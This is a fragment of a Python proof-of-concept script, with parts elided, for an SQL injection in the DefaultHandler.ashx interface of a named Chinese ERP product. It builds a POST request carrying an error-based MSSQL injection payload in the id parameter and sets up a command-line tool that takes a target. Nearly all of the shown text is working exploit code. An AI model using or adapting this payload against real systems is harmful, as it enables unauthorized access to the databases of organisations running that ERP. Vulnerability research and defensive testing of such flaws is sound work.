...
def poc(target):
    payload="/ashx/DefaultHandler.ashx"
    headres={
       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
        "Content-Length": "115",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data="""action=GetDetail&status=300&id=1+and+%01(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','1')),3,32))<0--"""
    target = target.strip()
...
def main():
    #定义
    parser=argparse.ArgumentParser(description="润申信息科技ERP系统DefaultHandler.ashx接口存在sql注入漏洞")
    # 添加命令行参数
